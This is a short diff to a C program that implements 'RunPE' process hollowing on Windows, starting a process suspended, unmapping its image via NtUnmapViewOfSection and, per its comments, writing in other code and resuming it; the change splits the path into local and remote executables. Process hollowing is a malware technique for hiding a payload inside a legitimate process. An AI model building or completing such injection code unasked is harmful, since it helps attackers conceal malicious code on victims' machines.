@@ -4,7 +4,8 @@
 
 typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 
-char *PATH = "target.exe";
+char *Local_PATH = "local.exe";
+char *Remote_PATH = "remote.exe";
 
 void RunPE(const char* path) {
 
@@ -15,7 +16,7 @@ void RunPE(const char* path) {
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     si.cb = sizeof(si);
-    BOOL bRet = CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    BOOL bRet = CreateProcessA(Local_PATH, (LPSTR)"cmd", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     /*
         2. Read the remote code
@@ -104,6 +105,6 @@ int main(int argc, wchar_t* argv[]) {
             5. Write the remote code
             6. Resume the suspended process
     */
-    RunPE(PATH);
+    RunPE(Remote_PATH);
     return 0;
 }
